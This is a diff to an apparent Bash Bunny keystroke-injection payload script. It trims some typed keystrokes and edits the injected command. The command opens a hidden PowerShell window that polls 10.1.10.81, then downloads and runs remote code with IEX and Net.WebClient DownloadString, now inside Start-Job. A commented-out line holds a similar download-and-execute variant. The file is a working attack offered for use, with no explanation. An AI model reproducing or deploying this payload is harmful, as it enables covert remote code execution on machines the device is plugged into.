@@ -21,18 +21,10 @@ Q ENTER
 Q DELAY 1000
 Q ALT y
 Q DELAY 500
-Q ALT o
-Q DELAY 500
-Q LEFTARROW
-Q DELAY 100
-Q ENTER
-Q DELAY 1200
-Q ENTER
-Q DELAY 800
 
 LED SPECIAL2
 #Powershell Payload: first wait for connection to bunny webserver, then run network config
-Q STRING "powershell -W Hidden \"while (\$true) {If (Test-Connection 10.1.10.81 -count 1) {IEX (New-Object Net.WebClient).DownloadString('http://10.1.10.81/update');exit}}\""
+Q STRING "powershell -W Hidden \"while (\$true) {If (Test-Connection 10.1.10.81 -count 1) {Start-Job -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://10.1.10.81/update')};exit}}\""
 #Q STRING "Start-Sleep -Seconds 15 ; while (\$true) {If (Test-Connection 10.1.10.81 -count 1) {IEX (New-Object Net.WebClient).DownloadString('http://10.1.10.81/update')}}"
 Q DELAY 300
 Q ENTER
